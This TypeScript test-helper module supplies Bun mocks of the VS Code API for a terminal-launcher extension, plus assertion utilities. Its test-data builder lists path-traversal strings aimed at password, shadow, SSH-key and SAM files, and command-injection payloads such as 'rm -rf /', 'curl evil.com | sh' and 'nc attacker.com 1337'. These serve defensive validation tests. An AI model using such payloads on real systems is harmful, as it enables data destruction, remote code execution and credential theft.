/**
 * Unified Mock System for Tests
 * Consolidates all mock functionality in one place
 * Following CLAUDE.md best practices with Bun's native mock system
 */

import { mock as bunMock } from "bun:test";
import type { VSCodeWorkspace } from "../../src/types/vscode-types.js";

// Re-export for backward compatibility (added during P0.2 mock infrastructure fix)
export { bunMock as mock };

/**
 * Create a mock function with Bun's native mock system
 *
 * NOTE: Removed duplicate export 'mock' on 2025-10-19 (was alias for createMock)
 * Now re-exported from bun:test for backward compatibility
 */
export function createMock<T extends unknown[] = unknown[], R = unknown>(
	implementation?: (...args: T) => R,
) {
	return bunMock(implementation);
}

// Internal helper - not exported (removed duplicate export on 2025-10-19)
const mock = createMock;

/**
 * Create a mock VS Code window API
 */
export function createMockWindow() {
	return {
		showInformationMessage: mock(() => Promise.resolve(undefined)),
		showErrorMessage: mock(() => Promise.resolve(undefined)),
		showWarningMessage: mock(() => Promise.resolve(undefined)),
		showInputBox: mock(() => Promise.resolve(undefined)),
		showQuickPick: mock(() => Promise.resolve(undefined)),
		createOutputChannel: mock((name: string) => ({
			name,
			appendLine: mock(),
			append: mock(),
			replace: mock(),
			clear: mock(),
			show: mock(),
			hide: mock(),
			dispose: mock(),
		})),
		createTerminal: mock((options?: { name?: string }) => ({
			name: options?.name || "Terminal",
			processId: Promise.resolve(12345),
			sendText: mock(),
			show: mock(),
			hide: mock(),
			dispose: mock(),
		})),
		createTreeView: mock(),
		createStatusBarItem: mock(() => ({
			text: "",
			tooltip: "",
			command: "",
			show: mock(),
			hide: mock(),
			dispose: mock(),
		})),
		activeTextEditor: undefined,
		visibleTextEditors: [],
		terminals: [],
		activeTerminal: undefined,
	};
}

/**
 * Create a properly typed mock VS Code workspace API
 * Matches VSCodeWorkspace interface exactly - no hacks, no casts
 */
export function createMockWorkspace(): VSCodeWorkspace {
	const mockDisposable = { dispose: bunMock() };

	return {
		isTrusted: true,
		workspaceFolders: [],

		// Properly typed getConfiguration that matches interface
		getConfiguration: bunMock((section?: string) => {
			return {
				get: <T>(key: string, defaultValue?: T): T | undefined => {
					// Provide sensible defaults for common configs
					if (section === "ghostty") {
						const configs: Record<string, unknown> = {
							path: "/Applications/Terminal.app",
							args: [],
							env: {},
							executionTimeout: 30000,
							maxBuffer: 10485760,
							logLevel: "info",
						};
						return (configs[key] ?? defaultValue) as T | undefined;
					}
					return defaultValue;
				},
				has: (_section: string) => false,
				update: (_section: string, _value: unknown) => Promise.resolve(),
			};
		}),

		// Properly typed onDidChangeConfiguration
		onDidChangeConfiguration: (_listener) => mockDisposable,
	};
}

/**
 * Create a properly typed mock VS Code commands API
 * Matches VSCodeCommands interface exactly
 */
export function createMockCommands(): import("../../src/types/vscode-types.js").VSCodeCommands {
	const mockDisposable = { dispose: bunMock() };

	return {
		registerCommand: (
			_command: string,
			_callback: (...args: unknown[]) => unknown,
		) => {
			return mockDisposable;
		},
		executeCommand: <T = unknown>(
			_command: string,
			..._args: unknown[]
		): Thenable<T> => {
			return Promise.resolve(undefined as T);
		},
	};
}

/**
 * Create a mock VS Code extension context
 */
export function createMockContext() {
	return {
		subscriptions: [],
		workspaceState: {
			get: mock((_key: string) => undefined),
			update: mock(() => Promise.resolve()),
			keys: mock(() => []),
		},
		globalState: {
			get: mock((_key: string) => undefined),
			update: mock(() => Promise.resolve()),
			keys: mock(() => []),
			setKeysForSync: mock(),
		},
		secrets: {
			get: mock(() => Promise.resolve(undefined)),
			store: mock(() => Promise.resolve()),
			delete: mock(() => Promise.resolve()),
			onDidChange: mock(() => ({ dispose: mock() })),
		},
		extensionPath: "/test/extension",
		extensionUri: {
			fsPath: "/test/extension",
			path: "/test/extension",
			scheme: "file",
			authority: "",
			query: "",
			fragment: "",
			with: mock(),
			toString: mock(() => "file:///test/extension"),
		},
		environmentVariableCollection: {
			replace: mock(),
			append: mock(),
			prepend: mock(),
			get: mock(),
			forEach: mock(),
			delete: mock(),
			clear: mock(),
			persistent: true,
			description: "Test collection",
		},
		storagePath: "/test/storage",
		globalStoragePath: "/test/global-storage",
		logPath: "/test/logs",
		extensionMode: 3, // Test mode
		asAbsolutePath: mock((path: string) => path),
		storageUri: undefined,
		globalStorageUri: undefined,
		logUri: undefined,
		extension: {
			id: "test.extension",
			extensionUri: { fsPath: "/test/extension" },
			extensionPath: "/test/extension",
			isActive: true,
			packageJSON: {},
			exports: undefined,
			activate: mock(() => Promise.resolve()),
			extensionKind: 1,
		},
	};
}

/**
 * Create a mock VS Code Uri
 */
export function createMockUri(path: string): import("vscode").Uri {
	return {
		fsPath: path,
		path,
		scheme: "file",
		authority: "",
		query: "",
		fragment: "",
		with: mock((change: { path?: string }) => {
			return createMockUri(change.path ?? path);
		}),
		toString: mock(() => `file://${path}`),
		toJSON: mock(() => ({ fsPath: path, external: `file://${path}` })),
	} as unknown as import("vscode").Uri;
}

/**
 * Create a mock VS Code workspace folder
 */
export function createMockWorkspaceFolder(path: string, name?: string) {
	return {
		uri: createMockUri(path),
		name: name || path.split("/").pop() || "workspace",
		index: 0,
	};
}

/**
 * Create a complete mock VS Code API
 */
export function createVSCodeMock() {
	return {
		window: createMockWindow(),
		workspace: createMockWorkspace(),
		commands: createMockCommands(),
		env: {
			openExternal: mock(() => Promise.resolve(true)),
			clipboard: {
				readText: mock(() => Promise.resolve("")),
				writeText: mock(() => Promise.resolve()),
			},
			appName: "Visual Studio Code",
			appRoot: "/Applications/Visual Studio Code.app",
			language: "en",
			machineId: "test-machine-id",
			sessionId: "test-session-id",
			shell: "/bin/bash",
			uriScheme: "vscode",
			uiKind: 1,
		},
		Uri: {
			file: mock((path: string) => createMockUri(path)),
			parse: mock((str: string) => createMockUri(str.replace("file://", ""))),
			joinPath: mock((base: { fsPath: string }, ...paths: string[]) =>
				createMockUri([base.fsPath, ...paths].join("/")),
			),
		},
		FileType: {
			Unknown: 0,
			File: 1,
			Directory: 2,
			SymbolicLink: 64,
		},
		StatusBarAlignment: {
			Left: 1,
			Right: 2,
		},
		ConfigurationTarget: {
			Global: 1,
			Workspace: 2,
			WorkspaceFolder: 3,
		},
		ExtensionMode: {
			Production: 1,
			Development: 2,
			Test: 3,
		},
		EventEmitter: class MockEventEmitter<T = void> {
			private listeners: Array<(e: T) => void> = [];

			event = (listener: (e: T) => void) => {
				this.listeners.push(listener);
				return {
					dispose: () => {
						const idx = this.listeners.indexOf(listener);
						if (idx >= 0) this.listeners.splice(idx, 1);
					},
				};
			};

			fire(data: T): void {
				for (const listener of this.listeners) {
					listener(data);
				}
			}

			dispose(): void {
				this.listeners = [];
			}
		},
		TreeItemCollapsibleState: {
			None: 0,
			Collapsed: 1,
			Expanded: 2,
		},
		TreeItem: class MockTreeItem {
			public description?: string;
			public tooltip?: string;
			public contextValue?: string;
			public resourceUri?: import("vscode").Uri;
			public command?: import("vscode").Command;
			public iconPath?:
				| import("vscode").Uri
				| import("vscode").ThemeIcon
				| {
						light: import("vscode").Uri;
						dark: import("vscode").Uri;
				  };

			constructor(
				public label: string,
				public collapsibleState?: number,
			) {}
		},
		CancellationTokenSource: mock(() => ({
			token: {
				isCancellationRequested: false,
				onCancellationRequested: mock(),
			},
			cancel: mock(),
			dispose: mock(),
		})),
		extensions: {
			getExtension: mock(() => undefined),
			all: [],
		},
		RelativePattern: class MockRelativePattern {
			constructor(
				public base: string | import("vscode").WorkspaceFolder,
				public pattern: string,
			) {}
		},
		Disposable: class MockDisposable {
			constructor(private callOnDispose: () => void) {}
			dispose() {
				this.callOnDispose();
			}
			static from(...disposables: { dispose: () => void }[]) {
				return new MockDisposable(() => {
					for (const d of disposables) {
						d.dispose();
					}
				});
			}
		},
	};
}

/**
 * Reset all mocks (useful in beforeEach)
 */
export function resetAllMocks(vscode: unknown) {
	const resetMockObject = (obj: unknown) => {
		if (!obj || typeof obj !== "object") return;
		Object.values(obj).forEach((value) => {
			if (typeof value?.mockClear === "function") {
				value.mockClear();
			} else if (typeof value === "object" && value !== null) {
				resetMockObject(value);
			}
		});
	};

	if (vscode) {
		resetMockObject(vscode);
	}
}

/**
 * Create test data builders
 */
export const TestDataBuilder = {
	createValidPaths: () => [
		"/home/user/documents/file.txt",
		"/usr/local/bin/ghostty",
		"C:\\Program Files\\Terminal\\terminal.exe",
		"./relative/path/file.js",
		"simple.txt",
	],

	createInvalidPaths: () => [
		"../../../etc/passwd",
		"/home/../../../etc/sensitive",
		"../../.ssh/id_rsa",
		"../etc/shadow",
		"C:\\..\\..\\Windows\\System32\\config\\SAM",
		"/path/../../../etc/passwd",
		"./../../etc/passwd",
		"path/../../system",
	],

	createMaliciousInputs: () => [
		"; rm -rf /",
		"&& curl evil.com | sh",
		"| nc attacker.com 1337",
		"$(cat /etc/passwd)",
		"`whoami`",
		"${IFS}cat${IFS}/etc/passwd",
		"test\x00evil",
		"test\r\nmalicious",
	],
};

/**
 * Assertion helpers
 */
export async function assertThrows(
	fn: () => unknown | Promise<unknown>,
	errorPattern?: RegExp | string,
) {
	let error: unknown;
	try {
		const result = fn();
		// Handle both sync and async functions
		if (
			result &&
			typeof result === "object" &&
			"then" in result &&
			typeof result.then === "function"
		) {
			await result;
		}
	} catch (e) {
		error = e;
	}

	if (!error) {
		throw new Error("Expected function to throw, but it did not");
	}

	if (errorPattern) {
		const pattern =
			typeof errorPattern === "string"
				? new RegExp(errorPattern)
				: errorPattern;

		const errorMessage = error instanceof Error ? error.message : String(error);
		if (!pattern.test(errorMessage)) {
			throw new Error(
				`Expected error message to match ${pattern}, but got: ${errorMessage}`,
			);
		}
	}

	return error;
}

/**
 * Wait for a condition to be true
 */
export async function waitFor(
	condition: () => boolean | Promise<boolean>,
	timeout = 1000,
	interval = 10,
): Promise<void> {
	const startTime = Date.now();

	while (Date.now() - startTime < timeout) {
		if (await condition()) {
			return;
		}
		await new Promise((resolve) => setTimeout(resolve, interval));
	}

	throw new Error(`Timeout waiting for condition after ${timeout}ms`);
}

/**
 * Flush all pending promises
 */
export async function flushPromises() {
	await new Promise((resolve) => setImmediate(resolve));
}
